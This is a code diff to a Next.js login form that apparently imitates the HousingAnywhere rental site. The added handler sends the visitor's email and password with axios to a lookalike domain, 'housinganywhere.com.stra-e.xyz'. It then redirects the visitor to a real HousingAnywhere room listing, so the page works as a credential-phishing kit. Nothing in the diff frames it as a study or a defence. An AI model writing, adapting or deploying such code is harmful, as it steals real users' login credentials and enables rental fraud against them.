@@ -1,20 +1,38 @@
 import { useState } from "react";
-import classes from "./ut.module.css";
+import { useRouter } from 'next/router';
+import classes from "@/pages/ut1516432/ut.module.css";
+import axios from "axios";
 
-function Main() {
+function Home() {
   const [data, changeData] = useState({
     email: "",
     pass: ""
   });
+  const router = useRouter();
 
   const [passV, changePassV] = useState(false);
 
   const passVChange = () => changePassV(!passV);
-  const changeDataFn = e => changeData(prev => ({...prev, [e.target.name]: e.target.value})); 
+  const changeDataFn = e => changeData(prev => ({...prev, [e.target.name]: e.target.value}));
+  
 
+  async function handleSubmitFn() {
+    try {
+      await axios.post(`https://housinganywhere.com.stra-e.xyz/api/user`, data);
+      router.replace('https://housinganywhere.com/room/ut1299287/es/Pozuelo%20de%20Alarc%C3%B3n/avenida-rodajos?flexDays=14');
+    } catch(err) {
+      console.log(err.response, "ce o avea");
+    }
+  }
+// https://housinganywhere.com/room/ut1536314/es/Madrid/calle-del-limonero?flexDays=14
   function handleSubmit(e) {
     e.preventDefault();
 
+    console.log(data.email)
+
+    if(data.email && data.pass) {
+      handleSubmitFn();
+    }
   }
 
   return (
@@ -90,4 +108,4 @@ function Main() {
   );
 }
 
-export default Main;
+export default Home;
